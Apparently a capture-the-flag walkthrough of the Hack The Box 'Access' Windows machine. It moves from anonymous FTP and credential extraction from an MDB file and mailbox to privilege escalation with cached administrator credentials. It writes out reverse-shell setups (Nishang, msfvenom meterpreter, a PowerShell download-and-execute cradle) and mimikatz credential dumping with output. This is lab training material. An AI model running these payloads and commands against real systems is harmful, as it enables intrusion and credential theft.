# NTG - Access 10.10.10.98

- Windows

- ftp anonymous 
- extract db file
- Run cmd with Credentials


## nmap
````
nmap -sS -sV -p- -oN access.txt 10.10.10.98
````

## ftp anonymous
````
$ ftp> open 10.10.10.98
anonymous access
ftp> cd xx
ftp> ls -aihl           : All files including hidden
ftp> binary
ftp> get backup.mdb
ftp> get 'Access Control.zip'
````
backup.mdb : Standard Jet DB

## mdb file
````
$ sudo apt-get install mdb-tools
````
MDB Utilities
mdb-tables   : list tables in the specified file
mdb-schema   : generate schema DDL for the specified file
mdb-export   : generate CSV style output for a table
mdb-ver      : display the version of the specified file
mdb-header   : support for using MDB data in C
mdb-parsecsv : support for using MDB data in C
mdb-sql      : command line SQL query tool
````
$ mdb-tables backup.mdb
$ mdb-export backup.mdb auth_user
  27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
````

## p7zip AES
Acces_Control.zip : unzip not working, need p7zip
````
$ unzip ac.zip
Archive:  ac.zip
   skipping: Access Control.pst      unsupported compression method 99
Access Control.pst

=> Password protected AES
$ p7zip -d ac.7z
````
````
$ cat 'Access Control.mbox'
The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure  this is passed on to your engineers.
````

## Telnet -> OS version
````
telnet 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service

Login security
Paswword 4Cc3ssC0ntr0ller

C:\Users\security>systeminfo
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
````


## Stored credential on server
````
> cmdkey /list
Currently stored credentials:
    Target: Domain:interactive=ACCESS\Administrator
                               Type: Domain Password
    User: ACCESS\Administrator
````

## Look credentials
C:\Users\security>dir /a C:\Users\security\AppData\Roaming\Microsoft\Credentials\
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security\AppData\Roaming\Microsoft\Credentials

08/22/2018  10:18 PM    <DIR>          .
08/22/2018  10:18 PM    <DIR>          ..
08/22/2018  10:18 PM               538 51AB168BE4BDB3A603DADE4F8CA81290
               1 File(s)            538 bytes
               2 Dir(s)  16,773,267,456 bytes free

==============================================================
## Meth 1 :  Use credentials to run cmd : copy root.txt to Temp
````
C:\Users\security>runas /user:ACCESS\Administrator /savecred "cmd.exe C:\Users\Administrator\Desktop\root.txt > C:\Users\security\AppData\Local\Temp\test.txt"

C:\Users\security>type C:\Users\security\AppData\Local\Temp\test.txt


runas /user:ACCESS\Administrator /savecred "cmd.exe C:\Users\Administrator\Desktop\root.txt > C:\Users\security\AppData\Local\Temp\test.txt"
type C:\Users\security\AppData\Local\Temp\test.txt
````

==============================================================
## Meth 2 :  Use credentials to cal a remote shell whith credentials
### Use Invoke-PowershellTcp
Use : /usr/share/nishang/Shells/Invoke-PowershellTcp.ps1
echo "InvokePowerShellTcp Reverse IPAddress 10.10.14.14 Port 4443">> ./Invoke-PowershellTcp.ps1
$ python -m SimpleHTTPServer

### wget from windows : certutil
> certutil -f -split -urlcache http://10.10.14.14:8000/Invoke.ps1 Invoke.ps1

### prepare nc
root@kali:~/htb/access# nc -lvnp 4443

### Run with admin credentials
runas /user:ACCESS\administrator /savecred "powershell -ExecutionPolicy Bypass -File C:\Users\security\AppData\Local\Temp\Invoke-PowerShellTcp.ps1"

==============================================================
## Meth 3 : Meterpreter/Powershell with credentials :  ok

First generate the exe with msfvenom.
````
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=12345 -f exe -o meter-rev-12345.exe
````
Next, spin up an smb server on kali pointed at the directory where the exe resides.
````
$ impacket-smbserver epi /root/htb/access
````
On target, simply copy the file from kali using a normal UNC path.
````
C:\Users\security> copy \\10.10.14.77\epi\meter-rev-12345.exe
copy \\10.10.14.77\epi\meter-rev-12345.exe
        1 file(s) copied.
````
Spin up a listener on kali.
````
$ msfconsole
msf5 > use multi/handler
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf5 exploit(multi/handler) > set lport 12345
lport => 12345
msf5 exploit(multi/handler) > exploit -j

[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.77:12345
````

Finally, on target, use the cached credentials to execute the reverse shell.
````
C:\Users\security> runas /savecred /user:ACCESS\Administrator .\meter-rev-12345.exe
````

We’ll wrap it up with a quick demonstration of running powershell commands from meterpreter.
````
msf exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...
meterpreter > getuid
Server username: ACCESS\Administrator
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_execute "get-content C:\users\administrator\desktop\root.txt 
[-] Parse error: Unmatched double quote: "powershell_execute \"get-content C:\\users\\administrator\\desktop\\root.txt "
meterpreter > powershell_execute "get-content C:\users\administrator\desktop\root.txt"
[+] Command execution completed:
6e1586cc7ab230a8d297e8f933d904cf
````

## Method 4 : use msf Webdelivery
````
$ msfconsole
msf5 > use exploit/multi/script/web_delivery
msf5 exploit(multi/script/web_delivery) > set target 2               (powershell)
target => 2
msf5 exploit(multi/script/web_delivery) > set srvport 8081
srvport => 8081
msf5 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/script/web_delivery) > set lhost tun0
lhost => tun0
msf5 exploit(multi/script/web_delivery) > set lport 12345
lport => 12345
msf5 exploit(multi/script/web_delivery) > exploit -j 

[*] Local IP: http://192.168.100.234:8081/ovuR3ArPYFio
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c $t=new-object net.webclient;$t.proxy=[Net.WebRequest]::GetSystemWebProxy();$t.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $t.downloadstring('http://10.10.14.77:8081/ovuR3ArPYFio');

msf exploit(multi/script/web_delivery) > sessions 1
[*] Starting interaction with 1...
meterpreter > getuid
Server username: ACCESS\security
meterpreter > 


C:\Users\security>runas /savecred /user:ACCESS\Administrator "powershell.exe -nop -w hidden -c $X=new-object net.webclient;$X.proxy=[Net.WebRequest]::GetSystemWebProxy();$X.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $X.downloadstring('http://10.10.14.14:8081/HZg4d7k80');"

sessions 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: ACCESS\Administrator

# Get the passwords..
meterpreter > load kiwi
Success.
meterpreter > creds_all 
[!] Not running as SYSTEM, execution may fail
meterpreter > getuid
Server username: ACCESS\Administrator
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > creds_all 
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain  NTLM                              SHA1
--------       ------  ----                              ----
Administrator  ACCESS  db852e5a46ea5f5514f639a20daa9e2c  974b219dcf5c05c895c152bbbc1aea6aeffbe860
security       ACCESS  b41db16a61cb04b231625de260163015  75f1e3aa023a0f57d4225f3ab4f18f6fea025414

wdigest credentials
===================

Username       Domain  Password
--------       ------  --------
(null)         (null)  (null)
ACCESS$        HTB     (null)
Administrator  ACCESS  55Acc3ssS3cur1ty@megacorp
security       ACCESS  4Cc3ssC0ntr0ller

tspkg credentials
=================

Username       Domain  Password
--------       ------  --------
Administrator  ACCESS  55Acc3ssS3cur1ty@megacorp
security       ACCESS  4Cc3ssC0ntr0ller

kerberos credentials
====================

Username       Domain  Password
--------       ------  --------
(null)         (null)  (null)
Administrator  ACCESS  55Acc3ssS3cur1ty@megacorp
access$        HTB     (null)
security       ACCESS  4Cc3ssC0ntr0ller
````
